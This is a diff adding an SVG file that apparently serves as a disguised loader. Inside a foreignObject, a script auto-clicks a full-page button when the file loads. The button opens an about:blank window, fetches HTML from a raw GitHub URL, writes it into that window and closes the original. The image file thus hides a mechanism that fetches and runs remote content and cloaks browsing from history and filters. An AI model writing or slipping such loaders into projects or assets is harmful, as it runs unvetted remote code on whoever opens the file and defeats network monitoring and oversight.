@@ -1,0 +1,13 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="height: 100%;">
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml" style="width: 100%; height: 100%;">
+      <button
+        onclick="const n = window.open('about:blank', '_blank'); if (n) { fetch('https://raw.githubusercontent.com/ethanchester/ivy/refs/heads/main/mainhtml').then(response =&gt; response.text()).then(text =&gt; { const d = n.document; d.open(); d.write(text); d.close(); window.close(); }); }"
+        style="width: 100%; height: 100%; font-size: 16pt; font-family: 'arial', sans-serif;"
+      >click here</button>
+      <script><![CDATA[
+        document.addEventListener("DOMContentLoaded", () => document.elementFromPoint(innerWidth / 2, innerHeight / 2)?.click());
+      ]]></script>
+    </div>
+  </foreignObject>
+</svg>
